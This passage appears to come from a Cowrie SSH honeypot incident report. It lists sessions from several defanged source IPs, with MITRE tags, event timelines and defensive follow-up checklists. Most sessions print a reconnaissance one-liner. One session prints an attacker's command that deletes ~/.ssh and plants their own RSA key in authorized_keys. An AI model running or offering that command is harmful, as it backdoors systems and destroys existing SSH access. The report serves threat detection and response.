| `2026-07-12 17:50:15` | `cowrie.command.input` |
| `2026-07-12 17:50:15` | `cowrie.command.input` |
| `2026-07-12 17:50:15` | `cowrie.command.success` |
| `2026-07-12 17:50:15` | `cowrie.command.input` |
| `2026-07-12 17:50:15` | `cowrie.command.input` |
| `2026-07-12 17:50:15` | `cowrie.command.input` |
| `2026-07-12 17:50:15` | `cowrie.command.input` |
| `2026-07-12 17:50:15` | `cowrie.log.closed` |
| `2026-07-12 17:50:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23bf1807f0d3

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:50 |
| **Last Seen** | 2026-07-12 17:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:50:47` | `cowrie.session.connect` |
| `2026-07-12 17:50:47` | `cowrie.client.version` |
| `2026-07-12 17:50:47` | `cowrie.client.kex` |
| `2026-07-12 17:50:48` | `cowrie.login.success` |
| `2026-07-12 17:50:49` | `cowrie.session.params` |
| `2026-07-12 17:50:49` | `cowrie.command.input` |
| `2026-07-12 17:50:49` | `cowrie.command.input` |
| `2026-07-12 17:50:49` | `cowrie.command.input` |
| `2026-07-12 17:50:49` | `cowrie.command.input` |
| `2026-07-12 17:50:49` | `cowrie.command.input` |
| `2026-07-12 17:50:49` | `cowrie.command.success` |
| `2026-07-12 17:50:49` | `cowrie.command.input` |
| `2026-07-12 17:50:49` | `cowrie.command.input` |
| `2026-07-12 17:50:49` | `cowrie.command.input` |
| `2026-07-12 17:50:49` | `cowrie.command.input` |
| `2026-07-12 17:50:49` | `cowrie.log.closed` |
| `2026-07-12 17:50:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7df2efeb6f2a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:51 |
| **Last Seen** | 2026-07-12 17:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:51:00` | `cowrie.session.connect` |
| `2026-07-12 17:51:01` | `cowrie.client.version` |
| `2026-07-12 17:51:01` | `cowrie.client.kex` |
| `2026-07-12 17:51:04` | `cowrie.login.success` |
| `2026-07-12 17:51:05` | `cowrie.session.params` |
| `2026-07-12 17:51:05` | `cowrie.command.input` |
| `2026-07-12 17:51:05` | `cowrie.command.input` |
| `2026-07-12 17:51:05` | `cowrie.command.input` |
| `2026-07-12 17:51:05` | `cowrie.command.input` |
| `2026-07-12 17:51:05` | `cowrie.command.input` |
| `2026-07-12 17:51:05` | `cowrie.command.success` |
| `2026-07-12 17:51:05` | `cowrie.command.input` |
| `2026-07-12 17:51:05` | `cowrie.command.input` |
| `2026-07-12 17:51:05` | `cowrie.command.input` |
| `2026-07-12 17:51:05` | `cowrie.command.input` |
| `2026-07-12 17:51:06` | `cowrie.log.closed` |
| `2026-07-12 17:51:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-237ea7fd3dfb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:52 |
| **Last Seen** | 2026-07-12 17:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:52:30` | `cowrie.session.connect` |
| `2026-07-12 17:52:30` | `cowrie.client.version` |
| `2026-07-12 17:52:30` | `cowrie.client.kex` |
| `2026-07-12 17:52:31` | `cowrie.login.success` |
| `2026-07-12 17:52:32` | `cowrie.session.params` |
| `2026-07-12 17:52:32` | `cowrie.command.input` |
| `2026-07-12 17:52:32` | `cowrie.command.input` |
| `2026-07-12 17:52:32` | `cowrie.command.input` |
| `2026-07-12 17:52:32` | `cowrie.command.input` |
| `2026-07-12 17:52:32` | `cowrie.command.input` |
| `2026-07-12 17:52:32` | `cowrie.command.success` |
| `2026-07-12 17:52:32` | `cowrie.command.input` |
| `2026-07-12 17:52:32` | `cowrie.command.input` |
| `2026-07-12 17:52:32` | `cowrie.command.input` |
| `2026-07-12 17:52:32` | `cowrie.command.input` |
| `2026-07-12 17:52:33` | `cowrie.log.closed` |
| `2026-07-12 17:52:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f24d4046973

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:52 |
| **Last Seen** | 2026-07-12 17:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:52:45` | `cowrie.session.connect` |
| `2026-07-12 17:52:46` | `cowrie.client.version` |
| `2026-07-12 17:52:46` | `cowrie.client.kex` |
| `2026-07-12 17:52:49` | `cowrie.login.success` |
| `2026-07-12 17:52:50` | `cowrie.session.params` |
| `2026-07-12 17:52:50` | `cowrie.command.input` |
| `2026-07-12 17:52:50` | `cowrie.command.input` |
| `2026-07-12 17:52:50` | `cowrie.command.input` |
| `2026-07-12 17:52:50` | `cowrie.command.input` |
| `2026-07-12 17:52:50` | `cowrie.command.input` |
| `2026-07-12 17:52:50` | `cowrie.command.success` |
| `2026-07-12 17:52:50` | `cowrie.command.input` |
| `2026-07-12 17:52:50` | `cowrie.command.input` |
| `2026-07-12 17:52:50` | `cowrie.command.input` |
| `2026-07-12 17:52:50` | `cowrie.command.input` |
| `2026-07-12 17:52:50` | `cowrie.log.closed` |
| `2026-07-12 17:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fe4167c91ef

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:52 |
| **Last Seen** | 2026-07-12 17:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:52:45` | `cowrie.session.connect` |
| `2026-07-12 17:52:46` | `cowrie.client.version` |
| `2026-07-12 17:52:46` | `cowrie.client.kex` |
| `2026-07-12 17:52:47` | `cowrie.login.success` |
| `2026-07-12 17:52:49` | `cowrie.session.params` |
| `2026-07-12 17:52:49` | `cowrie.command.input` |
| `2026-07-12 17:52:49` | `cowrie.command.input` |
| `2026-07-12 17:52:49` | `cowrie.command.input` |
| `2026-07-12 17:52:49` | `cowrie.command.input` |
| `2026-07-12 17:52:49` | `cowrie.command.input` |
| `2026-07-12 17:52:49` | `cowrie.command.success` |
| `2026-07-12 17:52:49` | `cowrie.command.input` |
| `2026-07-12 17:52:49` | `cowrie.command.input` |
| `2026-07-12 17:52:49` | `cowrie.command.input` |
| `2026-07-12 17:52:49` | `cowrie.command.input` |
| `2026-07-12 17:52:49` | `cowrie.log.closed` |
| `2026-07-12 17:52:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8274eeaa5fd

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-12 17:53 |
| **Last Seen** | 2026-07-12 17:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:53:03` | `cowrie.session.connect` |
| `2026-07-12 17:53:03` | `cowrie.client.version` |
| `2026-07-12 17:53:03` | `cowrie.client.kex` |
| `2026-07-12 17:53:04` | `cowrie.login.success` |
| `2026-07-12 17:53:05` | `cowrie.session.params` |
| `2026-07-12 17:53:05` | `cowrie.command.input` |
| `2026-07-12 17:53:05` | `cowrie.log.closed` |
| `2026-07-12 17:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b96b3f248be4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:54 |
| **Last Seen** | 2026-07-12 17:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:54:34` | `cowrie.session.connect` |
| `2026-07-12 17:54:35` | `cowrie.client.version` |
| `2026-07-12 17:54:35` | `cowrie.client.kex` |
| `2026-07-12 17:54:39` | `cowrie.login.success` |
| `2026-07-12 17:54:40` | `cowrie.session.params` |
| `2026-07-12 17:54:40` | `cowrie.command.input` |
| `2026-07-12 17:54:40` | `cowrie.command.input` |
| `2026-07-12 17:54:40` | `cowrie.command.input` |
| `2026-07-12 17:54:40` | `cowrie.command.input` |
| `2026-07-12 17:54:40` | `cowrie.command.input` |
| `2026-07-12 17:54:40` | `cowrie.command.success` |
| `2026-07-12 17:54:40` | `cowrie.command.input` |
| `2026-07-12 17:54:40` | `cowrie.command.input` |
| `2026-07-12 17:54:40` | `cowrie.command.input` |
| `2026-07-12 17:54:40` | `cowrie.command.input` |
| `2026-07-12 17:54:41` | `cowrie.log.closed` |
| `2026-07-12 17:54:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b5d98c9b483

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:54 |
| **Last Seen** | 2026-07-12 17:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:54:44` | `cowrie.session.connect` |
| `2026-07-12 17:54:45` | `cowrie.client.version` |
| `2026-07-12 17:54:45` | `cowrie.client.kex` |
| `2026-07-12 17:54:48` | `cowrie.login.success` |
| `2026-07-12 17:54:51` | `cowrie.session.params` |
| `2026-07-12 17:54:51` | `cowrie.command.input` |
| `2026-07-12 17:54:51` | `cowrie.command.input` |
| `2026-07-12 17:54:51` | `cowrie.command.input` |
| `2026-07-12 17:54:51` | `cowrie.command.input` |
| `2026-07-12 17:54:51` | `cowrie.command.input` |
| `2026-07-12 17:54:51` | `cowrie.command.success` |
| `2026-07-12 17:54:51` | `cowrie.command.input` |
| `2026-07-12 17:54:51` | `cowrie.command.input` |
| `2026-07-12 17:54:51` | `cowrie.command.input` |
| `2026-07-12 17:54:51` | `cowrie.command.input` |
| `2026-07-12 17:54:52` | `cowrie.log.closed` |
| `2026-07-12 17:54:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-135eb5eadae0

| Field | Detail |
|---|---|
| **Source IP** | `49.0.24[.]107` |
| **First Seen** | 2026-07-12 17:54 |
| **Last Seen** | 2026-07-12 17:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:54:46` | `cowrie.session.connect` |
| `2026-07-12 17:54:46` | `cowrie.client.version` |
| `2026-07-12 17:54:46` | `cowrie.client.kex` |
| `2026-07-12 17:54:48` | `cowrie.login.success` |
| `2026-07-12 17:54:49` | `cowrie.session.params` |
| `2026-07-12 17:54:49` | `cowrie.command.input` |
| `2026-07-12 17:54:49` | `cowrie.command.failed` |
| `2026-07-12 17:54:49` | `cowrie.log.closed` |
| `2026-07-12 17:54:50` | `cowrie.session.params` |
| `2026-07-12 17:54:50` | `cowrie.command.input` |
| `2026-07-12 17:54:51` | `cowrie.session.file_download` |
| `2026-07-12 17:54:51` | `cowrie.log.closed` |
| `2026-07-12 17:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.0.24[.]107` to AbuseIPDB if not already reported
- [ ] Block `49.0.24[.]107` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d63e323efeb9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:54 |
| **Last Seen** | 2026-07-12 17:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:54:48` | `cowrie.session.connect` |
| `2026-07-12 17:54:49` | `cowrie.client.version` |
| `2026-07-12 17:54:49` | `cowrie.client.kex` |
| `2026-07-12 17:54:51` | `cowrie.login.success` |
| `2026-07-12 17:54:52` | `cowrie.session.params` |
| `2026-07-12 17:54:52` | `cowrie.command.input` |
| `2026-07-12 17:54:52` | `cowrie.command.input` |
| `2026-07-12 17:54:52` | `cowrie.command.input` |
| `2026-07-12 17:54:52` | `cowrie.command.input` |
| `2026-07-12 17:54:52` | `cowrie.command.input` |
| `2026-07-12 17:54:52` | `cowrie.command.success` |
| `2026-07-12 17:54:52` | `cowrie.command.input` |
| `2026-07-12 17:54:52` | `cowrie.command.input` |
| `2026-07-12 17:54:52` | `cowrie.command.input` |
| `2026-07-12 17:54:52` | `cowrie.command.input` |
| `2026-07-12 17:54:53` | `cowrie.log.closed` |
| `2026-07-12 17:54:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da5423d928cb

| Field | Detail |
|---|---|
| **Source IP** | `49.0.24[.]107` |
| **First Seen** | 2026-07-12 17:54 |
| **Last Seen** | 2026-07-12 17:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:54:51` | `cowrie.session.connect` |
| `2026-07-12 17:54:51` | `cowrie.client.version` |
| `2026-07-12 17:54:51` | `cowrie.client.kex` |
| `2026-07-12 17:54:53` | `cowrie.login.success` |
| `2026-07-12 17:54:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.0.24[.]107` to AbuseIPDB if not already reported
- [ ] Block `49.0.24[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eafa79287f4f

| Field | Detail |
|---|---|
| **Source IP** | `49.0.24[.]107` |
| **First Seen** | 2026-07-12 17:54 |
| **Last Seen** | 2026-07-12 17:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:54:53` | `cowrie.session.connect` |
| `2026-07-12 17:54:53` | `cowrie.client.version` |
| `2026-07-12 17:54:54` | `cowrie.client.kex` |
| `2026-07-12 17:54:55` | `cowrie.login.success` |
| `2026-07-12 17:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.0.24[.]107` to AbuseIPDB if not already reported
- [ ] Block `49.0.24[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e06331de7786

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:56 |
| **Last Seen** | 2026-07-12 17:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:56:29` | `cowrie.session.connect` |
| `2026-07-12 17:56:30` | `cowrie.client.version` |
| `2026-07-12 17:56:30` | `cowrie.client.kex` |
| `2026-07-12 17:56:33` | `cowrie.login.success` |
| `2026-07-12 17:56:34` | `cowrie.session.params` |
| `2026-07-12 17:56:34` | `cowrie.command.input` |
| `2026-07-12 17:56:34` | `cowrie.command.input` |
| `2026-07-12 17:56:34` | `cowrie.command.input` |
| `2026-07-12 17:56:34` | `cowrie.command.input` |
| `2026-07-12 17:56:34` | `cowrie.command.input` |
| `2026-07-12 17:56:34` | `cowrie.command.success` |
| `2026-07-12 17:56:34` | `cowrie.command.input` |
| `2026-07-12 17:56:34` | `cowrie.command.input` |
| `2026-07-12 17:56:34` | `cowrie.command.input` |
| `2026-07-12 17:56:34` | `cowrie.command.input` |
| `2026-07-12 17:56:35` | `cowrie.log.closed` |
| `2026-07-12 17:56:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fe84590d8dc

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:56 |
| **Last Seen** | 2026-07-12 17:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:56:37` | `cowrie.session.connect` |
| `2026-07-12 17:56:37` | `cowrie.client.version` |
